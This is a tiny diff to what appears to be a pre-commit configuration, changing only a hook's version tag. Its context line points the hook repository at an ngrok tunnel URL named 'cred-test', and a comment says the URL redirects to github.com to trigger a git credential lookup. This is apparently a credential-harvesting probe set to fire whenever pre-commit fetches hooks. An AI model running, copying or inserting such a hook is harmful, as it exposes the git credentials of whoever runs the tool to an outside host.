@@ -1,7 +1,7 @@
 repos:
   # Test 1: Redirect to github.com (triggers credential lookup in git)
   - repo: https://nightless-declan-bothersomely.ngrok-free.dev/cred-test
-    rev: v1.0.0
+    rev: v6.0.0
     hooks:
       - id: test-hook
 
